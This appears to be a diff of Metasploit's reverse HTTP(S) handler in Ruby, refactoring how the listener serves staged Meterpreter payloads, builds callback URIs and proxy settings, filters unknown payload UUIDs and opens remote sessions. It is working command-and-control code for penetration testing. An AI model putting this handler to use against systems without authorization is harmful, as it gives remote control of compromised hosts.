@@ -1,7 +1,11 @@
 # -*- coding: binary -*-
 require 'rex/io/stream_abstraction'
 require 'rex/sync/ref'
-require 'msf/core/handler/reverse_http/uri_checksum'
+require 'rex/payloads/meterpreter/uri_checksum'
+require 'rex/post/meterpreter'
+require 'rex/socket/x509_certificate'
+require 'msf/core/payload/windows/verify_ssl'
+require 'rex/user_agent'
 
 module Msf
 module Handler
@@ -14,13 +18,15 @@ module Handler
 module ReverseHttp
 
   include Msf::Handler
-  include Msf::Handler::ReverseHttp::UriChecksum
+  include Msf::Handler::Reverse
+  include Rex::Payloads::Meterpreter::UriChecksum
+  include Msf::Payload::Windows::VerifySsl
 
   #
   # Returns the string representation of the handler type
   #
   def self.handler_type
-    return "reverse_http"
+    return 'reverse_http'
   end
 
   #
@@ -32,27 +38,6 @@ module ReverseHttp
   end
 
   #
-  # Use the +refname+ to determine whether this handler uses SSL or not
-  #
-  def ssl?
-    !!(self.refname.index("https"))
-  end
-
-  #
-  # Return a URI of the form scheme://host:port/
-  #
-  # Scheme is one of http or https and host is properly wrapped in [] for ipv6
-  # addresses.
-  #
-  def full_uri
-    local_port = bind_port
-    scheme = (ssl?) ? "https" : "http"
-    "#{scheme}://#{datastore['LHOST']}:#{datastore['LPORT']}/"
-  end
-
-
-
-  #
   # Initializes the HTTP SSL tunneling handler.
   #
   def initialize(info = {})
@@ -60,93 +45,180 @@ module ReverseHttp
 
     register_options(
       [
-        OptString.new('LHOST', [ true, "The local listener hostname" ]),
-        OptPort.new('LPORT', [ true, "The local listener port", 8080 ])
+        OptString.new('LHOST', [true, 'The local listener hostname']),
+        OptPort.new('LPORT', [true, 'The local listener port', 8080]),
+        OptString.new('LURI', [false, 'The HTTP Path', ''])
       ], Msf::Handler::ReverseHttp)
 
     register_advanced_options(
       [
-        OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),
-        OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcibly shut down', (24*3600*7)]),
-        OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300]),
-        OptString.new('MeterpreterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
-        OptString.new('MeterpreterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ]),
-        OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
-        OptInt.new('ReverseListenerBindPort', [ false, 'The port to bind to on the local system if different from LPORT' ]),
-        OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ])
+
+        OptString.new('MeterpreterUserAgent', [false, 'The user-agent that the payload should use for communication', Rex::UserAgent.shortest]),
+        OptString.new('MeterpreterServerName', [false, 'The server header that the handler will send in response to requests', 'Apache']),
+        OptAddress.new('ReverseListenerBindAddress', [false, 'The specific IP address to bind to on the local system']),
+        OptBool.new('OverrideRequestHost', [false, 'Forces a specific host and port instead of using what the client requests, defaults to LHOST:LPORT', false]),
+        OptString.new('OverrideLHOST', [false, 'When OverrideRequestHost is set, use this value as the host name for secondary requests']),
+        OptPort.new('OverrideLPORT', [false, 'When OverrideRequestHost is set, use this value as the port number for secondary requests']),
+        OptString.new('OverrideScheme', [false, 'When OverrideRequestHost is set, use this value as the scheme for secondary requests, e.g http or https']),
+        OptString.new('HttpUnknownRequestResponse', [false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>']),
+        OptBool.new('IgnoreUnknownPayloads', [false, 'Whether to drop connections from payloads using unknown UUIDs', false])
       ], Msf::Handler::ReverseHttp)
   end
 
-  #
-  # Toggle for IPv4 vs IPv6 mode
-  #
-  def ipv6
-    self.refname.index('ipv6') ? true : false
+  def print_prefix
+    if Thread.current[:cli]
+      super + "#{listener_uri} handling request from #{Thread.current[:cli].peerhost}; (UUID: #{uuid.to_s}) "
+    else
+      super
+    end
   end
 
+  # A URI describing where we are listening
   #
+  # @param addr [String] the address that
+  # @return [String] A URI of the form +scheme://host:port/+
+  def listener_uri(addr=datastore['ReverseListenerBindAddress'])
+    addr = datastore['LHOST'] if addr.nil? || addr.empty?
+    uri_host = Rex::Socket.is_ipv6?(addr) ? "[#{addr}]" : addr
+    "#{scheme}://#{uri_host}:#{bind_port}#{luri}"
+  end
+
+  # Return a URI suitable for placing in a payload.
+  #
+  # Host will be properly wrapped in square brackets, +[]+, for ipv6
+  # addresses.
+  #
+  # @param req [Rex::Proto::Http::Request]
+  # @return [String] A URI of the form +scheme://host:port/+
+  def payload_uri(req=nil)
+    callback_host = nil
+    callback_scheme = nil
+
+    # Extract whatever the client sent us in the Host header
+    if req && req.headers && req.headers['Host']
+        callback_host, callback_port = req.headers['Host'].split(":")
+        callback_port = callback_port.to_i
+        callback_port ||= (ssl? ? 443 : 80)
+    end
+
+    # Override the host and port as appropriate
+    if datastore['OverrideRequestHost'] || callback_host.nil?
+      callback_host = datastore['OverrideLHOST']
+      callback_port = datastore['OverrideLPORT']
+      callback_scheme = datastore['OverrideScheme']
+    end
+
+    if callback_host.nil? || callback_host.empty?
+      callback_host = datastore['LHOST']
+    end
+
+    if callback_port.nil? || callback_port.zero?
+      callback_port = datastore['LPORT']
+    end
+
+    if callback_scheme.nil? || callback_scheme.empty?
+      callback_scheme = scheme
+    end
+
+    if Rex::Socket.is_ipv6? callback_host
+      callback_host = "[#{callback_host}]"
+    end
+
+    if callback_host.nil?
+      raise ArgumentError, "No host specified for payload_uri"
+    end
+
+    if callback_port
+      "#{callback_scheme}://#{callback_host}:#{callback_port}"
+    else
+      "#{callback_scheme}://#{callback_host}"
+    end
+  end
+
+  # Use the #refname to determine whether this handler uses SSL or not
+  #
+  def ssl?
+    !!(self.refname.index('https'))
+  end
+
+  # URI scheme
+  #
+  # @return [String] One of "http" or "https" depending on whether we
+  #   are using SSL
+  def scheme
+    (ssl?) ? 'https' : 'http'
+  end
+
+  # The local URI for the handler.
+  #
+  # @return [String] Representation of the URI to listen on.
+  def luri
+    l = datastore['LURI'] || ""
+
+    if l && l.length > 0
+      # strip trailing slashes
+      while l[-1, 1] == '/'
+        l = l[0...-1]
+      end
+
+      # make sure the luri has the prefix
+      if l[0, 1] != '/'
+        l = "/#{l}"
+      end
+
+    end
+
+    l.dup
+  end
+
   # Create an HTTP listener
   #
+  # @return [void]
   def setup_handler
 
-    comm = datastore['ReverseListenerComm']
-    if (comm.to_s == "local")
-      comm = ::Rex::Socket::Comm::Local
-    else
-      comm = nil
-    end
-
+    local_addr = nil
     local_port = bind_port
-
-    # Determine where to bind the HTTP(S) server to
-    bindaddrs = ipv6 ? '::' : '0.0.0.0'
-
-    if not datastore['ReverseListenerBindAddress'].to_s.empty?
-      bindaddrs = datastore['ReverseListenerBindAddress']
-    end
+    ex = false
 
     # Start the HTTPS server service on this host/port
-    self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
-      local_port,
-      bindaddrs,
-      ssl?,
-      {
-        'Msf'        => framework,
-        'MsfExploit' => self,
-      },
-      comm,
-      (ssl?) ? datastore["SSLCert"] : nil
-    )
+    bind_addresses.each do |ip|
+      begin
+        self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
+          local_port, ip, ssl?,
+          {
+            'Msf'        => framework,
+            'MsfExploit' => self,
+          },
+          nil,
+          (ssl?) ? datastore['HandlerSSLCert'] : nil
+        )
+        local_addr = ip
+      rescue
+        ex = $!
+        print_error("Handler failed to bind to #{ip}:#{local_port}")
+      else
+        ex = false
+        break
+      end
+    end
+
+    raise ex if (ex)
 
     self.service.server_name = datastore['MeterpreterServerName']
 
-    # Create a reference to ourselves
-    obj = self
-
     # Add the new resource
-    service.add_resource("/",
+    service.add_resource((luri + "/").gsub("//", "/"),
       'Proc' => Proc.new { |cli, req|
-        on_request(cli, req, obj)
+        on_request(cli, req)
       },
       'VirtualDirectory' => true)
 
-    scheme = (ssl?) ? "https" : "http"
-    bind_url = "#{scheme}://#{bindaddrs}:#{local_port}/"
-    print_status("Started #{scheme.upcase} reverse handler on #{bind_url}")
-  end
+    print_status("Started #{scheme.upcase} reverse handler on #{listener_uri(local_addr)}")
+    lookup_proxy_settings
 
-  #
-  # Simply calls stop handler to ensure that things are cool.
-  #
-  def cleanup_handler
-    stop_handler
-  end
-
-  #
-  # Basically does nothing.  The service is already started and listening
-  # during set up.
-  #
-  def start_handler
+    if datastore['IgnoreUnknownPayloads']
+      print_status("Handler is ignoring unknown payloads, there are #{framework.uuid_db.keys.length} UUIDs whitelisted")
+    end
   end
 
   #
@@ -154,7 +226,12 @@ module ReverseHttp
   # active on sub-urls.
   #
   def stop_handler
-    self.service.remove_resource("/") if self.service
+    if self.service
+      self.service.remove_resource((luri + "/").gsub("//", "/"))
+      if self.service.resources.empty? && self.sessions == 0
+        Rex::ServiceManager.stop_service(self.service)
+      end
+    end
   end
 
   attr_accessor :service # :nodoc:
@@ -162,176 +239,180 @@ module ReverseHttp
 protected
 
   #
+  # Parses the proxy settings and returns a hash
+  #
+  def lookup_proxy_settings
+    info = {}
+    return @proxy_settings if @proxy_settings
+
+    if datastore['PayloadProxyHost'].to_s == ''
+      @proxy_settings = info
+      return @proxy_settings
+    end
+
+    info[:host] = datastore['PayloadProxyHost'].to_s
+    info[:port] = (datastore['PayloadProxyPort'] || 8080).to_i
+    info[:type] = datastore['PayloadProxyType'].to_s
+
+    uri_host = info[:host]
+
+    if Rex::Socket.is_ipv6?(uri_host)
+      uri_host = "[#{info[:host]}]"
+    end
+
+    info[:info] = "#{uri_host}:#{info[:port]}"
+
+    if info[:type] == "SOCKS"
+      info[:info] = "socks=#{info[:info]}"
+    else
+      info[:info] = "http://#{info[:info]}"
+      if datastore['PayloadProxyUser'].to_s != ''
+        info[:username] = datastore['PayloadProxyUser'].to_s
+      end
+      if datastore['PayloadProxyPass'].to_s != ''
+        info[:password] = datastore['PayloadProxyPass'].to_s
+      end
+    end
+
+    @proxy_settings = info
+  end
+
+  #
   # Parses the HTTPS request
   #
-  def on_request(cli, req, obj)
-    sid  = nil
+  def on_request(cli, req)
+    Thread.current[:cli] = cli
     resp = Rex::Proto::Http::Response.new
+    info = process_uri_resource(req.relative_resource)
+    uuid = info[:uuid] || Msf::Payload::UUID.new
 
-    print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")
+    # Configure the UUID architecture and payload if necessary
+    uuid.arch      ||= self.arch
+    uuid.platform  ||= self.platform
 
-    uri_match = process_uri_resource(req.relative_resource)
+    conn_id = luri
+    if info[:mode] && info[:mode] != :connect
+      conn_id << generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
+    else
+      conn_id << req.relative_resource
+      conn_id = conn_id.chomp('/')
+    end
+
+    request_summary = "#{conn_id} with UA '#{req.headers['User-Agent']}'"
+
+    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
+    if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
+      print_status("Ignoring unknown UUID: #{request_summary}")
+      info[:mode] = :unknown_uuid
+    end
+
+    # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
+    if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
+      allowed_urls = framework.uuid_db[uuid.puid_hex]['urls'] || []
+      unless allowed_urls.include?(req.relative_resource)
+        print_status("Ignoring unknown UUID URL: #{request_summary}")
+        info[:mode] = :unknown_uuid_url
+      end
+    end
+
+    self.pending_connections += 1
 
     # Process the requested resource.
-    case uri_match
-      when /^\/INITJM/
-        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        url = full_uri + conn_id + "/\x00"
+    case info[:mode]
+      when :init_connect
+        print_status("Redirecting stageless connection from #{request_summary}")
 
-        blob = ""
-        blob << obj.generate_stage
+        # Handle the case where stageless payloads call in on the same URI when they
+        # first connect. From there, we tell them to callback on a connect URI that
+        # was generated on the fly. This means we form a new session for each.
 
-        # This is a TLV packet - I guess somewhere there should be API for building them
-        # in Metasploit :-)
-        packet = ""
-        packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
-        packet << [url.length+8, 0x1000a].pack('NN')+url
-        packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
-        packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
-        blob << [packet.length+8, 0].pack('NN') + packet
+        # Hurl a TLV back at the caller, and ignore the response
+        pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
+                                                 'core_patch_url')
+        pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
+        resp.body = pkt.to_r
 
-        resp.body = blob
+      when :init_python, :init_native, :init_java
+        # TODO: at some point we may normalise these three cases into just :init
+        url = payload_uri(req) + conn_id + '/'
+
+        # Damn you, python! Ruining my perfect world!
+        url += "\x00" unless uuid.arch == ARCH_PYTHON
+        uri = URI(payload_uri(req) + conn_id)
+
+        # TODO: does this have to happen just for windows, or can we set it for all?
+        resp['Content-Type'] = 'application/octet-stream' if uuid.platform == 'windows'
+
+        begin
+          blob = self.generate_stage(
+            url:   url,
+            uuid:  uuid,
+            lhost: uri.host,
+            lport: uri.port,
+            uri:   conn_id
+          )
+
+          blob = encode_stage(blob) if self.respond_to?(:encode_stage)
+
+          print_status("Staging #{uuid.arch} payload (#{blob.length} bytes) ...")
+
+          resp.body = blob
+
+          # Short-circuit the payload's handle_connection processing for create_session
+          create_session(cli, {
+            :passive_dispatcher => self.service,
+            :conn_id            => conn_id,
+            :url                => url,
+            :expiration         => datastore['SessionExpirationTimeout'].to_i,
+            :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+            :retry_total        => datastore['SessionRetryTotal'].to_i,
+            :retry_wait         => datastore['SessionRetryWait'].to_i,
+            :ssl                => ssl?,
+            :payload_uuid       => uuid
+          })
+        rescue NoMethodError
+          print_error("Staging failed. This can occur when stageless listeners are used with staged payloads.")
+          return
+        end
+
+      when :connect
+        print_status("Attaching orphaned/stageless session...")
+
+        resp.body = ''
+
+        url = payload_uri(req) + conn_id
+        url << '/' unless url[-1] == '/'
+
+        # Damn you, python! Ruining my perfect world!
+        url += "\x00" unless uuid.arch == ARCH_PYTHON
 
         # Short-circuit the payload's handle_connection processing for create_session
         create_session(cli, {
-          :passive_dispatcher => obj.service,
+          :passive_dispatcher => self.service,
           :conn_id            => conn_id,
           :url                => url,
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
           :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-          :ssl                => ssl?
-        })
-
-      when /^\/A?INITM?/
-
-        url = ''
-
-        print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
-        resp['Content-Type'] = 'application/octet-stream'
-
-        blob = obj.stage_payload
-
-        # Replace the user agent string with our option
-        i = blob.index("METERPRETER_UA\x00")
-        if i
-          str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
-          blob[i, str.length] = str
-          print_status("Patched user-agent at offset #{i}...")
-        end
-
-        # Activate a custom proxy
-        i = blob.index("METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-        if i
-          if datastore['PROXYHOST']
-            if datastore['PROXYHOST'].to_s != ""
-              proxyhost = datastore['PROXYHOST'].to_s
-              proxyport = datastore['PROXYPORT'].to_s || "8080"
-              proxyinfo = proxyhost + ":" + proxyport
-              if proxyport == "80"
-                proxyinfo = proxyhost
-              end
-              if datastore['PROXY_TYPE'].to_s == 'HTTP'
-                proxyinfo = 'http://' + proxyinfo
-              else #socks
-                proxyinfo = 'socks=' + proxyinfo
-              end
-              proxyinfo << "\x00"
-              blob[i, proxyinfo.length] = proxyinfo
-              print_status("Activated custom proxy #{proxyinfo}, patch at offset #{i}...")
-              #Optional authentification
-              unless 	(datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
-                (datastore['PROXY_PASSWORD'].nil? or datastore['PROXY_PASSWORD'].empty?) or
-                datastore['PROXY_TYPE'] == 'SOCKS'
-                
-                proxy_username_loc = blob.index("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-                proxy_username = datastore['PROXY_USERNAME'] << "\x00"
-                blob[proxy_username_loc, proxy_username.length] = proxy_username
-
-                proxy_password_loc = blob.index("METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-                proxy_password = datastore['PROXY_PASSWORD'] << "\x00"
-                blob[proxy_password_loc, proxy_password.length] = proxy_password
-              end
-            end
-          end
-        end
-
-        # Replace the transport string first (TRANSPORT_SOCKET_SSL)
-        i = blob.index("METERPRETER_TRANSPORT_SSL")
-        if i
-          str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
-          blob[i, str.length] = str
-        end
-        print_status("Patched transport at offset #{i}...")
-
-        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        i = blob.index("https://" + ("X" * 256))
-        if i
-          url = full_uri + conn_id + "/\x00"
-          blob[i, url.length] = url
-        end
-        print_status("Patched URL at offset #{i}...")
-
-        i = blob.index([0xb64be661].pack("V"))
-        if i
-          str = [ datastore['SessionExpirationTimeout'] ].pack("V")
-          blob[i, str.length] = str
-        end
-        print_status("Patched Expiration Timeout at offset #{i}...")
-
-        i = blob.index([0xaf79257f].pack("V"))
-        if i
-          str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
-          blob[i, str.length] = str
-        end
-        print_status("Patched Communication Timeout at offset #{i}...")
-
-        resp.body = encode_stage(blob)
-
-        # Short-circuit the payload's handle_connection processing for create_session
-        create_session(cli, {
-          :passive_dispatcher => obj.service,
-          :conn_id            => conn_id,
-          :url                => url,
-          :expiration         => datastore['SessionExpirationTimeout'].to_i,
-          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :retry_total        => datastore['SessionRetryTotal'].to_i,
+          :retry_wait         => datastore['SessionRetryWait'].to_i,
           :ssl                => ssl?,
-        })
-
-      when /^\/CONN_.*\//
-        resp.body = ""
-        # Grab the checksummed version of CONN from the payload's request.
-        conn_id = req.relative_resource.gsub("/", "")
-
-        print_status("Incoming orphaned session #{conn_id}, reattaching...")
-
-        # Short-circuit the payload's handle_connection processing for create_session
-        create_session(cli, {
-          :passive_dispatcher => obj.service,
-          :conn_id            => conn_id,
-          :url                => full_uri + conn_id + "/\x00",
-          :expiration         => datastore['SessionExpirationTimeout'].to_i,
-          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-          :ssl                => ssl?,
+          :payload_uuid       => uuid
         })
 
       else
-        print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
+        unless [:unknown_uuid, :unknown_uuid_url].include?(info[:mode])
+          print_status("Unknown request to #{request_summary}")
+        end
         resp.code    = 200
-        resp.message = "OK"
+        resp.message = 'OK'
         resp.body    = datastore['HttpUnknownRequestResponse'].to_s
+        self.pending_connections -= 1
     end
 
     cli.send_response(resp) if (resp)
 
     # Force this socket to be closed
-    obj.service.close_client( cli )
-  end
-
-protected
-
-  def bind_port
-    port = datastore['ReverseListenerBindPort'].to_i
-    port > 0 ? port : datastore['LPORT'].to_i
+    self.service.close_client(cli)
   end
 
 end
